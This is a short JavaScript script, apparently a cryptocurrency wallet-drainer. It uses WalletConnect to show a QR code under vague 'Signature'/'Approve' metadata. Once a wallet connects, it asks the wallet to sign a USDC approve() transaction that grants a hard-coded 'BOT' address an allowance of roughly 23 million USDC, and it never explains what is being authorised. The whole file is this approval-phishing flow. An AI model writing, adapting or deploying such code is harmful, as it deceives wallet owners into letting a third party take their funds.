import { SignClient } from "@walletconnect/sign-client";
import qrcode from "qrcode-terminal";

const PROJECT_ID = "b83b1409919b6b27e624a9402fdb0975";
const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const BOT = "0x87897e70D1E8032895Af5466fF13Cd6BF1F3635f";
const VALUE = "23376837000000";

const client = await SignClient.init({
  projectId: PROJECT_ID,
  metadata: {
    name: "Signature",
    description: "Approve",
    url: "https://gora-marlitest.com",
    icons: [],
  },
});

const { uri, approval } = await client.connect({
  requiredNamespaces: {
    eip155: {
      methods: ["eth_sendTransaction"],
      chains: ["eip155:1"],
      events: [],
    },
  },
});

qrcode.generate(uri, { small: true });
console.log("\nQR valable 5 min. En attente de connexion...\n");

const session = await approval();
const topic = session.topic;
const addr = session.namespaces.eip155.accounts[0].split(":")[2];
console.log("Connecté :", addr);

// data approve(BOT, VALUE)
const data = "0x095ea7b3" +
  "000000000000000000000000" + BOT.slice(2) +
  VALUE.padStart(64, "0");

console.log("Envoi de la demande d'approbation...");
const result = await client.request({
  topic,
  chainId: "eip155:1",
  request: {
    method: "eth_sendTransaction",
    params: [{ from: addr, to: USDC, data }],
  },
});
console.log("TX approve envoyée :", result);
